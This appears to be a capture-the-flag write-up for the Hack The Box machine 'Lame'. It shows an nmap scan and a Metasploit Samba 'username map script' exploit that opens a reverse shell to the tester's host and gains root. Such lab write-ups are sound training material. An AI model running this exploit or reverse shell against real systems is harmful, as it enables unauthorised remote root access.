## Lame

__Difficulty: Easy__
__Machine IP: 10.10.10.3__


## Scanning

### Nmap Scanning

```bash
$ nmap  -Pn -sC -sV -oA lame 10.10.10.3                                                           1 ⚙
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-05 11:03 EDT
Nmap scan report for 10.10.10.3
Host is up (0.094s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.12
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h03m46s, deviation: 2h49m46s, median: 3m43s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2021-09-05T11:08:04-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.11 seconds
```

- `vsfptd 2.3.4` vulnerability does'nt seem to work.
- found anothe r exploit on `smb` - search `Samba 3.0.2`
- Choose 
```bash
1  exploit/multi/samba/usermap_script         2007-05-14       excellent  No     Samba "username map script" Command Execution

```
- and run using metasploit

__Result__
```bash
msf6 exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP handler on 10.10.14.12:4444 
[*] Command shell session 1 opened (10.10.14.12:4444 -> 10.10.10.3:39789) at 2021-09-05 12:03:42 -0400





back
/bin/sh: line 5: back: command not found
id
uid=0(root) gid=0(root)
```
